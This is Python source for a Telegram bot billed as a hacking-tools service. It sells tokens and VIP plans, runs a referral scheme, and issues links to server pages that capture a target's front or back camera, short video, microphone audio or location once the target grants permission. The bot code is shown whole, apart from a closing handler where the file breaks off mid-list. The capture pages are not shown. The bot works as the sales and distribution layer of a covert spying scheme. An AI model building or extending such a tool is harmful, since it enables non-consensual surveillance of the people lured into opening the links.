# ============================================================
#   BOT.PY  —  Ayush_Hacking_Tools_Bot
#   Owner     : @L0RD_DANZO
#   Admin ID  : 8696846732
#   Features  : Referral + Tokens + VIP + Camera/Audio/Location
# ============================================================

import io
import json
import os
import random
import string
import threading
import sqlite3
import traceback
from datetime import datetime, timedelta

from flask import Flask, request, render_template
from PIL import Image, ImageDraw
import telebot
from telebot import types

# ----------------- 1. CONFIG -----------------
with open("config.json", "r") as f:
    config = json.load(f)

BOT_TOKEN = config.get("bot_token")
ADMIN_ID = int(config.get("admin_id", 8696846732))
OWNER_USERNAME = config.get("owner_username", "L0RD_DANZO")
BOT_USERNAME = config.get("bot_username", "Ayush_Hacking_Tools_Bot")
SERVER_URL = config.get("server_url", "https://example.com")
CHANNELS = config.get("channels", [])
GROUP = config.get("group", {})
REF_CFG = config.get("referral", {})

REF_REWARD = int(REF_CFG.get("referrer_reward_tokens", 10))
REF_BONUS = int(REF_CFG.get("referred_bonus_tokens", 5))
REF_MIN = int(REF_CFG.get("min_referrals_for_reward", 1))
REF_ENABLED = bool(REF_CFG.get("enabled", True))

DEV_TAG = f"👨‍💻 Developer: @{OWNER_USERNAME}"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)
DB_FILE = "users.db"

# ----------------- 1.5 PREMIUM EMOJIS -----------------
EMOJI_FIRE    = "5289722755871162900"
EMOJI_STAR    = "5372849966689566579"
EMOJI_ROCKET  = "5359664288241829619"
EMOJI_CROWN   = "6237927637906364256"
EMOJI_SHIELD  = "6235476345451716705"
EMOJI_MONEY   = "6244678063775289843"
EMOJI_PHONE   = "6239930832128056797"
EMOJI_CHECK   = "4958689671950369798"
EMOJI_CROSS   = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK    = "4956719506027185156"
EMOJI_GIFT    = "5084613633418199991"
EMOJI_BELL    = "5098265504796115765"
EMOJI_GEAR    = "5116414868357907335"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(t): return t.translate(SMALL_CAPS_MAP)
def em(eid, fb="⭐"):
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>' if eid else fb

# ----------------- 1.6 SQLITE admins -----------------
def db_init():
    con = sqlite3.connect(DB_FILE)
    con.execute("CREATE TABLE IF NOT EXISTS admins(id INTEGER PRIMARY KEY)")
    con.execute("INSERT OR IGNORE INTO admins(id) VALUES(?)", (ADMIN_ID,))
    con.commit(); con.close()
db_init()

def admin_list():
    con = sqlite3.connect(DB_FILE)
    rows = con.execute("SELECT id FROM admins").fetchall()
    con.close()
    return [r[0] for r in rows]

def admin_add(uid):
    con = sqlite3.connect(DB_FILE)
    con.execute("INSERT OR IGNORE INTO admins(id) VALUES(?)", (uid,))
    con.commit(); con.close()

def admin_del(uid):
    con = sqlite3.connect(DB_FILE)
    con.execute("DELETE FROM admins WHERE id=?", (uid,))
    con.commit(); con.close()

def is_admin(uid):
    return int(uid) == ADMIN_ID or int(uid) in admin_list()

# ----------------- 2. DATABASE -----------------
def load_db():
    try:
        with open("database.json", "r") as f:
            return json.load(f)
    except Exception:
        return {"users": {}, "redeem_codes": {}}

def save_db(db):
    with open("database.json", "w") as f:
        json.dump(db, f, indent=4)

def _new_user_obj(user):
    return {
        "tokens": 0,
        "plan": "free",
        "expiry": None,
        "username": f"@{user.username}" if user.username else "No Username",
        "name": user.first_name,
        "referral_code": f"ref_{user.id}",
        "referred_by": None,
        "referral_count": 0,
        "referred_users": []
    }

def get_user_data(user):
    db = load_db()
    uid = str(user.id)
    if uid not in db["users"]:
        db["users"][uid] = _new_user_obj(user)
        save_db(db)
    # Backfill referral fields for old users
    u = db["users"][uid]
    if "referral_code" not in u:
        u["referral_code"] = f"ref_{uid}"
    if "referred_by" not in u:
        u["referred_by"] = None
    if "referral_count" not in u:
        u["referral_count"] = 0
    if "referred_users" not in u:
        u["referred_users"] = []
    save_db(db)
    return u

def has_active_plan(uid):
    if int(uid) == ADMIN_ID:
        return True
    db = load_db()
    user = db["users"].get(str(uid))
    if not user:
        return False
    if user.get("plan") == "unlimited":
        if not user.get("expiry"):
            return True
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp:
            return True
    if user.get("tokens", 0) > 0:
        return True
    return False

def deduct_token(uid):
    if int(uid) == ADMIN_ID:
        return
    db = load_db()
    user = db["users"].get(str(uid))
    if user and user.get("plan") != "unlimited":
        user["tokens"] = max(0, user.get("tokens", 0) - 1)
        save_db(db)

# ----------------- 3. REFERRAL ENGINE -----------------
def get_referral_link(uid):
    return f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"

def register_referral(new_uid, ref_code):
    """
    ref_code  : 'ref_<referrer_uid>'
    new_uid   : str(new user id)
    Returns   : (success, referrer_name, reward_msg)
    """
    if not REF_ENABLED:
        return False, None, "Referral system disabled."

    db = load_db()

    # Parse referrer
    if not ref_code.startswith("ref_"):
        return False, None, "Invalid referral code."
    try:
        referrer_uid = ref_code[4:].strip()
        if not referrer_uid.isdigit():
            raise ValueError
    except Exception:
        return False, None, "Invalid referral format."

    if referrer_uid == str(new_uid):
        return False, None, "Self-referral is not allowed."

    if referrer_uid not in db["users"]:
        return False, None, "Referrer not found."

    new_user = db["users"].get(str(new_uid))
    if not new_user:
        return False, None, "New user not registered."

    # Already referred by someone?
    if new_user.get("referred_by"):
        return False, None, "Aap pehle se kisi ke referral ho."

    # Apply
    new_user["referred_by"] = referrer_uid
    referrer = db["users"][referrer_uid]
    referrer.setdefault("referred_users", []).append(str(new_uid))
    referrer["referral_count"] = len(referrer["referred_users"])

    # Rewards
    referrer["tokens"] = referrer.get("tokens", 0) + REF_REWARD
    new_user["tokens"] = new_user.get("tokens", 0) + REF_BONUS

    save_db(db)

    reward_msg = (
        f"🎉 Referral successful!\n"
        f"👤 Referrer: {referrer.get('name','User')}\n"
        f"💰 +{REF_REWARD} tokens (referrer)\n"
        f"🎁 +{REF_BONUS} tokens (aapko)"
    )
    return True, referrer.get("name", "User"), reward_msg

def get_referral_stats(uid):
    db = load_db()
    user = db["users"].get(str(uid))
    if not user:
        return {"count": 0, "users": [], "earned": 0}
    cnt = user.get("referral_count", 0)
    earned = cnt * REF_REWARD
    return {"count": cnt, "users": user.get("referred_users", []), "earned": earned}

def get_top_referrers(limit=10):
    db = load_db()
    users = db.get("users", {})
    ranked = sorted(users.items(), key=lambda kv: kv[1].get("referral_count", 0), reverse=True)
    return [(uid, data) for uid, data in ranked if data.get("referral_count", 0) > 0][:limit]

# ----------------- 4. FORCE JOIN -----------------
def is_user_joined(user_id):
    if int(user_id) == ADMIN_ID:
        return True
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch["username"], user_id)
            if member.status not in ['creator', 'administrator', 'member', 'restricted']:
                return False
        except Exception:
            return False
    if GROUP:
        try:
            member = bot.get_chat_member(GROUP["username"], user_id)
            if member.status not in ['creator', 'administrator', 'member', 'restricted']:
                return False
        except Exception:
            return False
    return True

def get_force_join_markup():
    markup = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        markup.add(types.InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"]))
    if GROUP:
        markup.add(types.InlineKeyboardButton(f"👥 Join {GROUP['name']}", url=GROUP["url"]))
    markup.add(types.InlineKeyboardButton("✅ Check / Verified", callback_data="check_join"))
    return markup

# ----------------- 5. KEYBOARDS -----------------
def kbtn(text, style="primary"):
    b = types.KeyboardButton(text=text)
    try: setattr(b, "style", style)
    except Exception: pass
    return b

def get_main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(kbtn("📷 𝙲𝙰𝙼𝙴𝚁𝙰", "primary"), kbtn("🎵 Audio", "primary"))
    markup.row(kbtn("📍 Location", "success"), kbtn("💰 Price", "success"))
    markup.row(kbtn("🎁 Redeem code", "primary"), kbtn("👑 My balance", "primary"))
    markup.row(kbtn("🔗 Refer & Earn", "success"), kbtn("🏆 Leaderboard", "primary"))
    markup.row(kbtn("🔥 Pege", "danger"))
    if is_admin(user_id):
        markup.row(kbtn("🛠 Admin Panel", "danger"))
    return markup

def get_camera_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(kbtn("📷 Front camera", "primary"), kbtn("📷 Back camera", "primary"))
    markup.row(kbtn("🎥 front 8s video", "success"), kbtn("🎥 Back 8s video", "success"))
    markup.row(kbtn("⬅️ Back to home", "danger"))
    return markup

def get_admin_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.row(kbtn("📢 Broadcast", "danger"), kbtn("📊 Stats", "primary"))
    markup.row(kbtn("👥 Users List", "primary"), kbtn("🔗 Force Join", "success"))
    markup.row(kbtn("👤 Add Admin", "success"), kbtn("❌ Remove Admin", "danger"))
    markup.row(kbtn("📋 Admin List", "primary"), kbtn("🎫 Generate redeem", "success"))
    markup.row(kbtn("⚡ Activate plan", "primary"), kbtn("📊 User plan", "primary"))
    markup.row(kbtn("🏆 Referral Stats", "success"), kbtn("⬅️ Back to home", "danger"))
    return markup

def get_redeem_type_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(kbtn("👑 VIP", "success"), kbtn("🎫 Normal", "primary"))
    markup.row(kbtn("⬅️ Back to home", "danger"))
    return markup

# ----------------- 6. AVATAR -----------------
def make_circular_avatar(avatar_img, size=(130, 130), border_color="#2ECC71", border_width=5):
    avatar_img = avatar_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")
    mask = Image.new("L", size, 0)
    ImageDraw.Draw(mask).ellipse((0, 0, size[0], size[1]), fill=255)
    circular = Image.new("RGBA", size, (0, 0, 0, 0))
    circular.paste(avatar_img, (0, 0), mask=mask)
    ImageDraw.Draw(circular).ellipse(
        (border_width // 2, border_width // 2, size[0] - border_width // 2, size[1] - border_width // 2),
        outline=border_color, width=border_width
    )
    return circular

# ----------------- 7. CORE -----------------
def send_home_dashboard(chat_id, user):
    get_user_data(user)
    bot_name = bot.get_me().first_name
    welcome_text = (
        f"<blockquote>"
        f"🚀 Welcome to <b>{bot_name}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name : {user.first_name}\n"
        f"🆔 UID : <code>{user.id}</code>\n"
        f"🔗 Username : @{user.username if user.username else 'N/A'}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{DEV_TAG}\n"
        f"</blockquote>"
    )
    markup = get_main_menu(user.id)
    user_photos = bot.get_user_profile_photos(user.id)
    try:
        banner = Image.open("banner.png").convert("RGBA")
        if user_photos.total_count > 0:
            file_id = user_photos.photos[0][-1].file_id
            file_info = bot.get_file(file_id)
            downloaded = bot.download_file(file_info.file_path)
            avatar = make_circular_avatar(Image.open(io.BytesIO(downloaded)))
            banner.paste(avatar, (30, 30), avatar)
        buf = io.BytesIO()
        banner.convert("RGB").save(buf, format="JPEG", quality=95)
        buf.seek(0)
        bot.send_photo(chat_id, photo=buf, caption=welcome_text, reply_markup=markup)
    except Exception:
        bot.send_message(chat_id, welcome_text, reply_markup=markup)

# ----------------- 8. START + REFERRAL HANDLER -----------------
@bot.message_handler(commands=['start'])
def handle_start(message):
    user = message.from_user
    get_user_data(user)

    # Referral parse
    payload = ""
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) > 1:
            payload = parts[1].strip()
    except Exception:
        payload = ""

    ref_applied = False
    ref_referrer = None
    ref_msg = None

    if payload.startswith("ref_") and REF_ENABLED:
        ok, referrer_name, msg = register_referral(user.id, payload)
        ref_applied, ref_referrer, ref_msg = ok, referrer_name, msg

    if not is_user_joined(user.id):
        force_msg = (
            f"<blockquote>"
            f"⚠️ <b>Access Denied!</b>\n\n"
            f"Bot use karne ke liye hamare Channels aur Group join karo.\n\n"
            f"Join ke baad <b>'Check / Verified'</b> par click karein.\n"
            f"{DEV_TAG}\n</blockquote>"
        )
        bot.send_message(message.chat.id, force_msg, reply_markup=get_force_join_markup())
        return

    if ref_applied:
        try:
            bot.send_message(message.chat.id, f"<blockquote>{ref_msg}\n{DEV_TAG}</blockquote>")
            # Notify referrer
            try:
                bot.send_message(
                    int(ref_referrer_uid:=payload[4:]),
                    f"<blockquote>🎉 <b>New Referral!</b>\n"
                    f"👤 {user.first_name} joined via your link.\n"
                    f"💰 +{REF_REWARD} tokens added!\n{DEV_TAG}</blockquote>"
                )
            except Exception:
                pass
        except Exception:
            pass
    elif payload.startswith("ref_") and ref_msg and not ref_applied:
        try:
            bot.send_message(message.chat.id, f"<blockquote>{em(EMOJI_WARNING,'⚠️')} {ref_msg}\n{DEV_TAG}</blockquote>")
        except Exception:
            pass

    send_home_dashboard(message.chat.id, user)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def verify_join_callback(call):
    if is_user_joined(call.from_user.id):
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception: pass
        send_home_dashboard(call.message.chat.id, call.from_user)
    else:
        bot.answer_callback_query(call.id, "❌ Aapne abhi tak sabhi channels/group join nahi kiye!", show_alert=True)

# ----------------- 9. BALANCE -----------------
@bot.message_handler(func=lambda m: m.text and "My balance" in m.text)
def handle_my_balance(message):
    uid = str(message.from_user.id)
    db = load_db()
    user = db["users"].get(uid)
    if int(uid) == ADMIN_ID:
        bot.send_message(message.chat.id, f"<blockquote>👑 Activate VIP Lifetime ✅\n💰 Token : unlimited\n{DEV_TAG}</blockquote>")
        return
    if user and user.get("plan") == "unlimited" and user.get("expiry"):
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp:
            rem_days = max(1, (exp - datetime.now()).days + 1)
            bot.send_message(message.chat.id, f"<blockquote>👑 Activate VIP {rem_days}d ✅\n💰 Token : unlimited\n{DEV_TAG}</blockquote>")
            return
    tokens = user.get("tokens", 0) if user else 0
    refs = user.get("referral_count", 0) if user else 0
    bot.send_message(message.chat.id, (
        f"<blockquote>"
        f"❌ Not activate VIP\n"
        f"💰 Token : {tokens}\n"
        f"🔗 Referrals : {refs}\n"
        f"{DEV_TAG}</blockquote>"
    ))

# ----------------- 10. REFER & EARN -----------------
@bot.message_handler(func=lambda m: m.text and "Refer & Earn" in m.text)
def handle_refer(message):
    uid = message.from_user.id
    get_user_data(message.from_user)
    stats = get_referral_stats(uid)
    link = get_referral_link(uid)
    text = (
        f"<blockquote>"
        f"🔗 <b>REFER & EARN</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>Your Referrals:</b> {stats['count']}\n"
        f"💰 <b>Tokens Earned:</b> {stats['earned']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎁 <b>Rewards:</b>\n"
        f"  • Per referral: <b>+{REF_REWARD} tokens</b>\n"
        f"  • New user: <b>+{REF_BONUS} tokens</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 <b>Your Link:</b>\n"
        f"<code>{link}</code>\n\n"
        f"📤 Share karo aur tokens kamao!\n"
        f"{DEV_TAG}</blockquote>"
    )
    kb = types.InlineKeyboardMarkup(row_width=1)
    share_text = f"Join {BOT_USERNAME} and get free tokens! {link}"
    kb.add(types.InlineKeyboardButton(
        "📤 Share on WhatsApp",
        url=f"https://wa.me/?text={share_text.replace(' ', '%20')}"
    ))
    kb.add(types.InlineKeyboardButton(
        "📢 Share on Telegram",
        url=f"https://t.me/share/url?url={link}&text=Join%20{BOT_USERNAME}%20and%20get%20free%20tokens!"
    ))
    bot.send_message(message.chat.id, text, reply_markup=kb, disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text and "Leaderboard" in m.text)
def handle_leaderboard(message):
    top = get_top_referrers(10)
    if not top:
        return bot.send_message(message.chat.id, f"<blockquote>🏆 Leaderboard empty — koi referrals nahi abhi!\n{DEV_TAG}</blockquote>")
    lines = [f"🏆 <b>TOP 10 REFERRERS</b>\n━━━━━━━━━━━━━━━━━━━━\n"]
    for i, (uid, data) in enumerate(top, 1):
        medal = ["🥇", "🥈", "🥉"][i-1] if i <= 3 else f"{i}."
        lines.append(f"{medal} {data.get('name','User')} — <b>{data.get('referral_count',0)} refs</b>")
    lines.append(f"\n{DEV_TAG}")
    bot.send_message(message.chat.id, "<blockquote>" + "\n".join(lines) + "</blockquote>")

# ----------------- 11. PRICE -----------------
def send_price_menu(chat_id):
    price_text = (
        f"<blockquote>"
        f"💰 <b>PRICE LIST</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"5 token ₹10 | 10 token ₹15\n30 token ₹55 | 100 token ₹80\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Unlimited 3 days ₹30\n👑 Unlimited 7 days ₹60\n👑 Unlimited 30 days ₹200\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Buy karne ke liye owner ko message karein\n"
        f"{DEV_TAG}</blockquote>"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛒 Buy Subscription", url=f"https://t.me/{OWNER_USERNAME}"))
    bot.send_message(chat_id, price_text, reply_markup=markup, disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text and "Price" in m.text)
def handle_price_btn(message):
    send_price_menu(message.chat.id)

# ----------------- 12. CAMERA -----------------
@bot.message_handler(func=lambda m: m.text and "𝙲𝙰𝙼𝙴𝚁𝙰" in m.text)
def handle_camera_options(message):
    bot.send_message(message.chat.id, f"<blockquote>📷 <b>Camera Options:</b>\nNiche se select karein.\n{DEV_TAG}</blockquote>", reply_markup=get_camera_menu())

def handle_media_request(message, endpoint, label):
    uid = message.from_user.id
    if not has_active_plan(uid):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ <b>Koi subscription nahi hai</b>\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    deduct_token(uid)
    link = f"{SERVER_URL}/{endpoint}?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>{label} Link:</b>\n\n{link}\n\n⚠️ Link open karein, permission allow karein.\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text and "Front camera" in m.text)
def front_cam(m): handle_media_request(m, "ahd-wab", "Front Camera")

@bot.message_handler(func=lambda m: m.text and "Back camera" in m.text)
def back_cam(m): handle_media_request(m, "ahd-wab-1", "Back Camera")

@bot.message_handler(func=lambda m: m.text and "front 8s" in m.text)
def front_vid(m): handle_media_request(m, "ahd-wab-2", "Front 8s Video")

@bot.message_handler(func=lambda m: m.text and "Back 8s" in m.text)
def back_vid(m): handle_media_request(m, "ahd-wab-3", "Back 8s Video")

@bot.message_handler(func=lambda m: m.text and "🎵 Audio" in m.text)
def handle_audio_btn(message):
    uid = message.from_user.id
    if not has_active_plan(uid):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ <b>Koi subscription nahi</b>\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    deduct_token(uid)
    link = f"{SERVER_URL}/ahd-wab-4?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>Audio Link:</b>\n\n{link}\n\n⚠️ Mic permission allow karein.\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text and "📍 Location" in m.text)
def handle_location_btn(message):
    uid = message.from_user.id
    if not has_active_plan(uid):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ <b>Koi subscription nahi</b>\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    deduct_token(uid)
    link = f"{SERVER_URL}/ahd-wab-5?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>Location Link:</b>\n\n{link}\n\n⚠️ Location permission allow karein.\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

# ----------------- 13. NAVIGATION -----------------
@bot.message_handler(func=lambda m: m.text and "Back to home" in m.text)
def nav_home(m):
    send_home_dashboard(m.chat.id, m.from_user)

@bot.message_handler(func=lambda m: m.text == "🔥 Pege")
def nav_page(m):
    bot.reply_to(m, f"<blockquote>🚧 <b>Coming soon</b>\n{DEV_TAG}</blockquote>")

# ----------------- 14. REDEEM -----------------
@bot.message_handler(func=lambda m: m.text and "Redeem code" in m.text)
def ask_user_redeem_code(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>🎁 Apna redeem code send karo\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, process_user_redeem_input)

def process_user_redeem_input(message):
    if not message.text:
        return
    nav_keys = ["Back to home", "𝙲𝙰𝙼𝙴𝚁𝙰", "🎵 Audio", "📍 Location", "Price", "Redeem code",
                "My balance", "Pege", "Admin Panel", "Refer & Earn", "Leaderboard"]
    if any(k in message.text for k in nav_keys):
        send_home_dashboard(message.chat.id, message.from_user)
        return
    code = message.text.strip()
    db = load_db()
    if code in db.get("redeem_codes", {}):
        rc = db["redeem_codes"][code]
        if rc.get("uses_left", 0) > 0:
            uid = str(message.from_user.id)
            user = db["users"].get(uid) or get_user_data(message.from_user)
            if rc["type"] == "token":
                tokens_added = rc["value"]
                user["tokens"] = user.get("tokens", 0) + tokens_added
                res_text = f"✅ Successfully {tokens_added} tokens"
            else:
                days_added = rc["days"]
                user["plan"] = "unlimited"
                user["expiry"] = (datetime.now() + timedelta(days=days_added)).strftime("%Y-%m-%d %H:%M:%S")
                res_text = f"👑 VIP activated {days_added}d unlimited token"
            rc["uses_left"] -= 1
            if rc["uses_left"] <= 0:
                del db["redeem_codes"][code]
            save_db(db)
            bot.reply_to(message, f"<blockquote>{res_text}\n{DEV_TAG}</blockquote>")
            return
    bot.reply_to(message, f"<blockquote>❌ Invalid ya expired redeem code!\n{DEV_TAG}</blockquote>")

# ----------------- 15. ADMIN PANEL -----------------
broadcast_state = {}
addadmin_state = {}

@bot.message_handler(func=lambda m: m.text and "Admin Panel" in m.text)
def admin_panel_open(message):
    if not is_admin(message.from_user.id): return
    db = load_db()
    bot.send_message(message.chat.id, (
        f"<blockquote>"
        f"🛠 <b>ADMIN PANEL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner: <b>@{OWNER_USERNAME}</b>\n"
        f"👥 Users: <b>{len(db.get('users', {}))}</b>\n"
        f"🛡 Admins: <b>{len(admin_list())}</b>\n"
        f"🎫 Codes: <b>{len(db.get('redeem_codes', {}))}</b>\n"
        f"{DEV_TAG}</blockquote>"
    ), reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text and "📊 Stats" in m.text)
def admin_stats(message):
    if not is_admin(message.from_user.id): return
    db = load_db()
    total_refs = sum(u.get("referral_count", 0) for u in db.get("users", {}).values())
    bot.send_message(message.chat.id, (
        f"<blockquote>📊 <b>BOT STATS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Users: <b>{len(db.get('users', {}))}</b>\n"
        f"🛡 Admins: <b>{len(admin_list())}</b>\n"
        f"🎫 Codes: <b>{len(db.get('redeem_codes', {}))}</b>\n"
        f"🔗 Total Referrals: <b>{total_refs}</b>\n"
        f"{DEV_TAG}</blockquote>"
    ), reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text and "Users List" in m.text)
def admin_users_list(message):
    if not is_admin(message.from_user.id): return
    db = load_db()
    users = db.get("users", {})
    if not users:
        return bot.send_message(message.chat.id, "No users.", reply_markup=get_admin_menu())
    txt = f"<blockquote>👥 <b>Users ({len(users)}):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in list(users.items())[-50:]:
        txt += f"• {data.get('name','N/A')} | <code>{uid}</code> | refs={data.get('referral_count',0)}\n"
    txt += f"\n{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, txt, reply_markup=get_admin_menu())

# --- BROADCAST (STICKER SUPPORT) ---
@bot.message_handler(func=lambda m: m.text and "📢 Broadcast" in m.text)
def admin_broadcast_start(message):
    if not is_admin(message.from_user.id): return
    broadcast_state[message.chat.id] = True
    bot.send_message(message.chat.id, (
        f"<blockquote>📢 <b>Broadcast Mode ON</b>\n\n"
        f"Kuch bhi bhejo — text, photo, video, doc, sticker, audio, voice, animation.\n\n"
        f"Cancel: /cancel\n{DEV_TAG}</blockquote>"
    ), reply_markup=get_admin_menu())

@bot.message_handler(commands=["cancel"])
def cancel_cmd(message):
    broadcast_state.pop(message.chat.id, None)
    addadmin_state.pop(message.chat.id, None)
    menu = get_admin_menu() if is_admin(message.from_user.id) else get_main_menu(message.from_user.id)
    bot.reply_to(message, f"<blockquote>❌ Cancelled.\n{DEV_TAG}</blockquote>", reply_markup=menu)

@bot.message_handler(
    func=lambda m: m.chat.id in broadcast_state,
    content_types=["text", "photo", "video", "document", "sticker", "audio", "voice", "animation"]
)
def admin_broadcast_do(message):
    if not is_admin(message.from_user.id): return
    broadcast_state.pop(message.chat.id, None)
    db = load_db()
    ids = list(db.get("users", {}).keys())
    if not ids:
        return bot.send_message(message.chat.id, "No users.", reply_markup=get_admin_menu())
    st = bot.reply_to(message, f"📢 Sending to {len(ids)} users...")
    ok = fail = 0
    for uid in ids:
        try:
            bot.copy_message(int(uid), message.chat.id, message.message_id); ok += 1
        except Exception: fail += 1
    bot.edit_message_text(
        f"<blockquote>✅ <b>Broadcast Done</b>\n✔️ Sent: {ok}\n❌ Failed: {fail}\n👥 Total: {len(ids)}\n{DEV_TAG}</blockquote>",
        message.chat.id, st.message_id, reply_markup=get_admin_menu()
    )

# --- ADMIN MANAGER ---
@bot.message_handler(func=lambda m: m.text and "Add Admin" in m.text and "Remove" not in m.text)
def admin_add_start(message):
    if not is_admin(message.from_user.id): return
    addadmin_state[message.chat.id] = True
    bot.send_message(message.chat.id, f"<blockquote>👤 <b>Add Admin</b>\n\nUser ka <b>Telegram ID</b> bhejo:\n<i>Example: 1234567890</i>\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.chat.id in addadmin_state and m.text and m.text.isdigit())
def admin_add_done(message):
    addadmin_state.pop(message.chat.id, None)
    uid = int(message.text.strip())
    if uid in admin_list():
        return bot.send_message(message.chat.id, "⚠️ Ye already admin hai!", reply_markup=get_admin_menu())
    admin_add(uid)
    bot.send_message(message.chat.id, f"<blockquote>✅ <b>Admin Added</b>\n<code>{uid}</code>\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())
    try: bot.send_message(uid, "🛡 Aapko <b>Admin</b> bana diya gaya hai!\n/start karein.")
    except Exception: pass

@bot.message_handler(func=lambda m: m.text and "Remove Admin" in m.text)
def admin_rm_list(message):
    if not is_admin(message.from_user.id): return
    admins = admin_list()
    if not admins:
        return bot.send_message(message.chat.id, "No admins.", reply_markup=get_admin_menu())
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    for a in admins:
        if a == ADMIN_ID: continue
        kb.add(types.KeyboardButton(text=f"❌ {a}"))
    kb.add(types.KeyboardButton(text="⬅️ Back to home"))
    bot.send_message(message.chat.id, f"<blockquote>❌ <b>Remove Admin</b>\n\nJo hatana hai wo dabao:\n{DEV_TAG}</blockquote>", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text and m.text.startswith("❌ ") and m.text[2:].isdigit())
def admin_rm_do(message):
    if not is_admin(message.from_user.id): return
    uid = int(message.text[2:].strip())
    if uid == ADMIN_ID:
        return bot.send_message(message.chat.id, "❌ Owner ko remove nahi kar sakte!", reply_markup=get_admin_menu())
    admin_del(uid)
    bot.send_message(message.chat.id, f"<blockquote>✅ Admin removed (<code>{uid}</code>)\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())
    try: bot.send_message(uid, "❌ Aapko admin se hata diya gaya hai.")
    except Exception: pass

@bot.message_handler(func=lambda m: m.text and "📋 Admin List" in m.text)
def admin_list_btn(message):
    if not is_admin(message.from_user.id): return
    admins = admin_list()
    if not admins:
        return bot.send_message(message.chat.id, "No admins.", reply_markup=get_admin_menu())
    lines = [f"📋 <b>Admin List ({len(admins)}):</b>\n"]
    for a in admins:
        tag = "👑 Owner" if a == ADMIN_ID else "🛡 Admin"
        lines.append(f"{tag} — <code>{a}</code>")
    lines.append(f"\n{DEV_TAG}")
    bot.send_message(message.chat.id, "<blockquote>" + "\n".join(lines) + "</blockquote>", reply_markup=get_admin_menu())

# --- FORCE JOIN INFO ---
@bot.message_handler(func=lambda m: m.text and "🔗 Force Join" in m.text)
def admin_fj_info(message):
    if not is_admin(message.from_user.id): return
    chs = "\n".join([f"• {c['name']}" for c in CHANNELS]) if CHANNELS else "None"
    bot.send_message(message.chat.id, (
        f"<blockquote>🔗 <b>Force Join Status</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Channels:\n{chs}\n\nGroup: {GROUP.get('name', 'None')}\n{DEV_TAG}</blockquote>"
    ), reply_markup=get_admin_menu())

# --- ADMIN REFERRAL STATS ---
@bot.message_handler(func=lambda m: m.text and "Referral Stats" in m.text and is_admin(m.from_user.id))
def admin_referral_stats(message):
    db = load_db()
    users = db.get("users", {})
    total = sum(u.get("referral_count", 0) for u in users.values())
    top = get_top_referrers(5)
    lines = [
        f"🏆 <b>REFERRAL STATS</b>\n━━━━━━━━━━━━━━━━━━━━\n",
        f"👥 Total Users: <b>{len(users)}</b>",
        f"🔗 Total Referrals: <b>{total}</b>",
